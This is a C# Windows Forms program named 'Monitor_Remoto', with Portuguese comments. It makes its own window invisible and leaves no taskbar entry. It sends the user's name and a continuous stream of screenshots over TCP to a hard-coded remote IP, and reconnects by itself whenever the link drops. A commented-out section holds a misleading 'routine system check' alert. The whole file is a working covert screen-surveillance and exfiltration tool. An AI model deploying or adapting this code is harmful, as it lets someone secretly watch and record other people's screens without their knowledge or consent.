using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net.Sockets;
using System.Runtime.Remoting;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace Monitor_Remoto
{
    public partial class Form1 : Form
    {
        private TcpClient client;
        private NetworkStream stream;
        private Thread sendThread;
        private bool isRunning = false;
        private System.Windows.Forms.Timer alertaTimer;


        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            //Timer para alerta a cada 6h
            //alertaTimer = new System.Windows.Forms.Timer();
            //alertaTimer.Interval = 6 * 60 * 60 * 1000; 
            //alertaTimer.Tick += AlertaTimer_Tick;
            //alertaTimer.Start();

            SystemEvents.SessionSwitch += SystemEvents_SessionSwitch;

            this.ShowInTaskbar = false; 
            this.WindowState = FormWindowState.Minimized; 
            this.Opacity = 0; 

            sendThread = new Thread(Remoto);
            sendThread.Start();

            Application.DoEvents();
        }

        protected override void OnFormClosed(FormClosedEventArgs e)
        {
            SystemEvents.SessionSwitch -= SystemEvents_SessionSwitch;
            base.OnFormClosed(e);
        }

        private void SystemEvents_SessionSwitch(object sender, SessionSwitchEventArgs e)
        {
            if (e.Reason == SessionSwitchReason.SessionLock)
            {
                // Sessão bloqueada: pare o monitoramento
                isRunning = false;
            }
            else if (e.Reason == SessionSwitchReason.SessionUnlock)
            {
                // Sessão desbloqueada: retome o monitoramento
                if (!isRunning)
                {
                    isRunning = true;
                    if (sendThread == null || !sendThread.IsAlive)
                    {
                        sendThread = new Thread(Remoto);
                        sendThread.Start();
                    }
                }
            }
        }


        private void IniciaListening()
        {
            string nomeUsuario = Environment.UserName;
            byte[] nomeBytes   = Encoding.UTF8.GetBytes(nomeUsuario);
            byte[] nomeLength  = BitConverter.GetBytes(nomeBytes.Length);

            try
            {
                client = new TcpClient("xxx.xxx.xxx.x", 8888); // <- aqui altera o IP para conectar ao servidor do técnico ou seja o IP da máquina do tecnico
                //Portas: 9000 e 8888 ; 
                // Pode dar probleama na Porta do técnico, se der erro, verifique a porta do técnico e se o servidor está rodando.
                stream = client.GetStream();

                stream.Write(nomeLength, 0, 4);
                stream.Write(nomeBytes, 0, nomeBytes.Length);
            }
            catch
            {
                   client = null;
            }
        }

        private void Reconnect()
        {
            while (true)
            {
                try
                {
                    IniciaListening();
                    break; // Reconexão bem-sucedida
                }
                catch
                {
                    Thread.Sleep(3000); // Tentar novamente após 5 segundos|| talvez possa diminuir o tempo de espera se necessário
                }
            }
        }

        private void Remoto()
        {
            try
            {
                isRunning = true;

                while (isRunning)
                {
                    if (!isRunning)
                    {
                        Thread.Sleep(500);
                        continue;
                    }

                    if (client == null || !client.Connected)
                    {
                        Reconnect();
                    }
                    else
                    {
                        using (var bmp = CaptureScreen())
                        {
                            var data = ImageToBytes(bmp);

                            stream.Write(BitConverter.GetBytes(data.Length), 0, 4);
                            stream.Write(data, 0, data.Length);
                        }

                        Thread.Sleep(50);
                    }
                }
            }
            catch
            {
                while (isRunning && (client == null || !client.Connected))
                {
                    try
                    {
                        Reconnect();
                    }
                    catch
                    {
                      //Thread.Sleep(3000); 
                      // Aguarda antes de tentar novamente
                    }

                }
            }
        }

        private Bitmap CaptureScreen()
        {
            Rectangle bounds = Screen.PrimaryScreen.Bounds;
            Bitmap bmp = new Bitmap(bounds.Width, bounds.Height);

            using (Graphics g = Graphics.FromImage(bmp))
            {
                g.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
            }

            return bmp;
        }
        
        #region Sistema de Alerta - retirar
        //private void AlertaTimer_Tick(object sender, EventArgs e)
        //{
        //    client = null;             
        //    Reconnect();

        //    // Exibe um alerta a cada 6 horas
        //    MessageBox.Show(
        //            "INFO: O sistema realizou uma verificação de rotina.\nPara continuar, clique em 'OK'.",
        //            "Informação do Sistema",
        //            MessageBoxButtons.OK,
        //            MessageBoxIcon.Information
        //            );
        //}
        #endregion
        private byte[] ImageToBytes(Bitmap bmp)
        {
            using (MemoryStream ms = new MemoryStream())
            {
                bmp.Save(ms, ImageFormat.Jpeg);
                return ms.ToArray();
            }
        }
    }
}
